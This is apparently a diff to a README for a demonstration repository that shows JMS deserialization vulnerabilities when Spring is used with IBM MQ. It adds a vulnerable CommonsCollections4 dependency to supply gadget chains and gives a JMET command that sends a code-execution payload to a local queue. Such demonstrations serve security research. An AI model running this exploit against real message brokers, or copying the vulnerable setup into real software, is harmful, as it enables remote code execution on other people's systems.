@@ -1,3 +1,17 @@
+# JMS Deserialization Vulnerabilities When Using Spring with IBM MQ
+
+This repository contains multiple branches, that rely on different [MessageConverters](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/jms/support/converter/MessageConverter.html) to demonstrate deserialization vulnerabilities.
+
+The branches include configuration compatible with the [ibmcom/mq](https://hub.docker.com/r/ibmcom/mq) docker image.
+
+The repository also includes Gradle dependency definition for a vulnerable version of `CommonsCollections4` in order to provide usable gadgets to demonstrate code execution. Real-world targets may (or may not) require custom gadget chains for an attacker to achieve a desirable effect. 
+
+Exploitability can be demonstrated with [JMET](https://github.com/matthiaskaiser/jmet) (if built with WebSphereMQ support):
+
+```
+java -jar jmet-0.1.0-all.jar -I WebSphereMQ -pw passw0rd -u admin -Q DEV.QUEUE.1 -Zc DEV.ADMIN.SVRCONN -Zq QM1 -v -Y "touch /tmp/pwned"  -Yp CommonsCollections4 localhost 1414
+```
+
 # IBM MQ JMS Spring Components
 
 This repository contains code to help to provide Spring developers with easy configuration of the IBM MQ JMS package.
